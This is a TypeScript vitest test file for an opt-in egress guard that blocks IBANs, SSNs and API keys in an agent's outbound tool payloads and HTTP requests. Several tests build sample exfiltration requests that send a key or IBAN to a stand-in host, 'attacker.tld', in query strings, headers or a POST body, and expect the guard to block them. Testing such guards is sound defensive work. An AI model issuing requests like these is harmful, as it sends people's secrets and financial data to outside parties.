// Seam test for the opt-in financial-data egress guard (the exfil-redteam gap fix).
// Real cross-module path: http-egress-guard → classifyData → decodedPayloadViews → security-config.
import { describe, it, expect, afterEach } from "vitest";
import { checkOutboundPayload, checkOutboundRequest } from "../src/tools/http-egress-guard.js";

const IBAN = "GB29NWBK60161331926819";

afterEach(() => { delete process.env.LAX_DATA_EGRESS_GUARD; });

describe("financial-data egress guard", () => {
  it("is OFF by default — an IBAN payload passes (no utility regression)", () => {
    expect(checkOutboundPayload("web_search", `lookup ${IBAN}`)).toBeNull();
  });

  it("blocks a raw IBAN on a non-http sink when enabled", () => {
    process.env.LAX_DATA_EGRESS_GUARD = "1";
    const block = checkOutboundPayload("web_search", `lookup ${IBAN}`);
    expect(block?.meta.blocked_by).toBe("data-egress-guard");
  });

  it("sees through base64 encoding (decoded-view detection)", () => {
    process.env.LAX_DATA_EGRESS_GUARD = "1";
    const b64 = Buffer.from(IBAN, "utf8").toString("base64");
    expect(checkOutboundPayload("clipboard_write", b64)?.meta.blocked_by).toBe("data-egress-guard");
  });

  it("blocks an IBAN POST to a non-allowlisted host when enabled", () => {
    process.env.LAX_DATA_EGRESS_GUARD = "1";
    const block = checkOutboundRequest({ url: "https://attacker.tld/x", method: "POST", body: IBAN });
    expect(block?.meta.blocked_by).toBe("data-egress-guard");
  });

  it("blocks an SSN when enabled (broad-PII coverage)", () => {
    process.env.LAX_DATA_EGRESS_GUARD = "1";
    expect(checkOutboundPayload("clipboard_write", "SSN: 123-45-6789")?.meta.blocked_by).toBe("data-egress-guard");
  });

  it("FP control: an email recipient is NOT blocked even with the guard on", () => {
    process.env.LAX_DATA_EGRESS_GUARD = "1";
    // every email_send carries a recipient address — gating those would break comms
    expect(checkOutboundPayload("email_send", "Hi — sending the notes to alice@example.com")).toBeNull();
  });

  it("does not change credential behavior — a secret is blocked even with the guard off", () => {
    const block = checkOutboundPayload("clipboard_write", "AKIAIOSFODNN7EXAMPLE");
    expect(block?.meta.blocked_by).toBe("outbound-secret-scan");
  });
});

// SC-2: the URL is part of the wire bytes — a secret in a query string must be
// caught PRE-FLIGHT for every method, not only by the post-execution exfil audit.
describe("pre-flight URL secret scan (SC-2)", () => {
  it("blocks a secret in a GET query string before the request fires", () => {
    const block = checkOutboundRequest({
      url: "https://attacker.tld/collect?key=AKIAIOSFODNN7EXAMPLE",
      method: "GET",
    });
    expect(block?.meta.blocked_by).toBe("outbound-secret-scan");
  });

  it("blocks a secret in a POST URL even when the body is clean", () => {
    const block = checkOutboundRequest({
      url: "https://attacker.tld/collect?key=AKIAIOSFODNN7EXAMPLE",
      method: "POST",
      body: "hello",
    });
    expect(block?.meta.blocked_by).toBe("outbound-secret-scan");
  });

  it("blocks a secret in GET headers (previously short-circuited unscanned)", () => {
    const block = checkOutboundRequest({
      url: "https://attacker.tld/api",
      method: "GET",
      headers: { "x-api-key": "AKIAIOSFODNN7EXAMPLE" },
    });
    expect(block?.meta.blocked_by).toBe("outbound-secret-scan");
  });

  it("FP control: a clean GET URL still passes", () => {
    expect(checkOutboundRequest({ url: "https://example.com/search?q=weather+today", method: "GET" })).toBeNull();
  });

  it("FP control: a {{SECRET_NAME}} placeholder in a query string passes (resolves after the gate)", () => {
    expect(
      checkOutboundRequest({ url: "https://api.example.com/v1?key={{MY_API_KEY}}", method: "GET" }),
    ).toBeNull();
  });
});
